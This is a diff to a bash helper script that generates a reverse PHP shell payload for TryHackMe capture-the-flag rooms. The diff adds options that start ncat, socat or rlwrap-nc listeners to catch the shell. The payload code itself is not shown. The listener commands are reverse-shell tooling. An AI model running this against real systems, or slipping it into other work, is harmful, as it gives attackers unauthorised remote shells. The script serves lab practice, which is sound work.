@@ -5,20 +5,45 @@ show_help() {
     echo "Usage: $(basename "$0") [options]"
     echo ""
     echo "Options:"
-    echo "  -h, --help    Show this help message and exit"
+    echo "  -h, --help       Show this help message and exit"
+    echo "  -n               Use ncat as the listener after building the payload"
+    echo "  -s               Use socat as the listener after building the payload"
+    echo "  -r               Use rlwrap with nc as the listener after building the payload"
     echo ""
     echo "Description:"
     echo "make-rshell-php will generate a reverse PHP shell payload you can upload for TryHackMe rooms."
     echo "If you leave the listen address blank, it will automatically use your current IP address."
-    echo "It first checks /tmp/thmip.txt and falls back to using the system's IP."
     echo ""
     exit 0
 }
 
+# Default listener type
+LISTENER_TYPE=""
+
 # Parse command-line arguments
-if [[ "$1" == "-h" || "$1" == "--help" ]]; then
-    show_help
-fi
+while [[ "$#" -gt 0 ]]; do
+    case "$1" in
+        -h|--help)
+            show_help
+            ;;
+        -n)
+            LISTENER_TYPE="ncat"
+            shift
+            ;;
+        -s)
+            LISTENER_TYPE="socat"
+            shift
+            ;;
+        -r)
+            LISTENER_TYPE="rlwrap"
+            shift
+            ;;
+        *)
+            echo "Unknown option: $1"
+            show_help
+            ;;
+    esac
+done
 
 # Prompt for values
 echo "make-rshell-php will generate a reverse PHP shell payload you can upload for TryHackMe rooms."
@@ -68,24 +93,41 @@ sed -i "s/THM_ATTACKBOX_PORT_HERE/${PORT}/" /tmp/rshell-payload.php
 echo "Your payload has been created:"
 echo "/tmp/rshell-payload.php"
 echo "The payload's target is ${IP_ADDRESS}:${PORT}"
-echo ""
 
-# Check if any listeners are running on the specified port
-echo "Checking for active listeners on port ${PORT}..."
-if netstat -tuln | grep -q ":${PORT}" && (pgrep -x nc || pgrep -x ncat || pgrep -x socat || pgrep -x rlwrap); then
-    echo "A listener is detected on port ${PORT}."
-else
-    echo "No listeners detected on port ${PORT}!"
-    echo "Don't forget to set up a listener. Here are some commands you can use:"
-    echo ""
-    echo "Rlwrap:"
-    echo " $ rlwrap nc -lvnp ${PORT} # Enhancing Netcat Shell with Rlwrap to use GNU readline allowing editing keyboard and history."
-    echo ""
-    echo "Ncat:"
-    echo " $ ncat -lvnp ${PORT} # Listening for Reverse Shells"
-    echo " $ ncat --ssl -lvnp ${PORT} # Listening for Reverse Shells with SSL"
-    echo ""
-    echo "Socat:"
-    echo " $ socat -d -d TCP-LISTEN:${PORT} STDOUT # Creates socket connection between two data sources and/or hosts."
-    echo ""
-fi
+# Check listener type and transform into the chosen one
+case "$LISTENER_TYPE" in
+    ncat)
+        echo "Starting ncat listener on ${PORT}..."
+        ncat -lvnp ${PORT}
+        ;;
+    socat)
+        echo "Starting socat listener on ${PORT}..."
+        socat TCP-LISTEN:${PORT},reuseaddr,fork -
+        ;;
+    rlwrap)
+        echo "Starting rlwrap nc listener on ${PORT}..."
+        rlwrap nc -lvnp ${PORT}
+        ;;
+    *)
+        # No listener specified, check for active listeners
+        echo "Checking for active listeners on port ${PORT}..."
+        if netstat -tuln | grep -q ":${PORT}" && (pgrep -x nc || pgrep -x ncat || pgrep -x socat || pgrep -x rlwrap); then
+            echo "A listener is detected on port ${PORT}."
+        else
+            echo "No listeners detected on port ${PORT}!"
+            echo "Don't forget to set up a listener. Here are some commands you can use:"
+            echo ""
+            echo "For nc (netcat):"
+            echo "  nc -lvnp ${PORT}"
+            echo ""
+            echo "For ncat:"
+            echo "  ncat -lvnp ${PORT}"
+            echo ""
+            echo "For socat:"
+            echo "  socat TCP-LISTEN:${PORT},reuseaddr,fork -"
+            echo ""
+            echo "For rlwrap with nc:"
+            echo "  rlwrap nc -lvnp ${PORT}"
+        fi
+        ;;
+esac
